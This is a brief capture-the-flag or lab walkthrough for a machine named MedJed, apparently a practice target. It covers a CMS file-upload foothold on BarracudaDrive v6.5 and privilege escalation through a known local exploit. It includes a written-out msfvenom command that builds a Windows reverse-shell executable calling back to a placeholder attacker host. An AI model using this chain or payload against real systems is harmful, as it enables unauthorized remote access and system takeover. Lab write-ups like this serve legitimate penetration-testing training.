# MedJed - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Web Service on Port 8000
- Discovered **BarracudaDrive v6.5** running on port `8000`.
- Searched online and found a known **privilege escalation (PE) exploit** for this version.

### 🛠️ 2. CMS File Upload
- Found a CMS interface allowing file uploads.
- Navigated to:
  ```
  xampp/htdocs/
  ```
- Uploaded a `shell.php` payload.

### 🔓 3. Trigger the Shell
- Accessed the uploaded file via the secondary HTTP port:
  ```
  http://<target-ip>:45332/shell.php
  ```
- Successfully received a reverse shell.

---

## ⚙️ Privilege Escalation

### 📄 1. Use Exploit from `windows/local/48789.txt`
- Instead of creating a new user (as suggested in the original PoC), generated a reverse shell payload using `msfvenom`.

### 💣 2. Execute Reverse Shell Payload
- Crafted payload:
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe
  ```
- Transferred `shell.exe` to the target.
- Executed it and received a privileged reverse shell connection.

---

## 🧠 Notes

- The foothold required exploiting a vulnerable CMS upload feature.
- Privilege escalation was simple due to a known local exploit and a flexible payload strategy.
- Using `msfvenom` instead of user-creation gave faster and more direct root access.
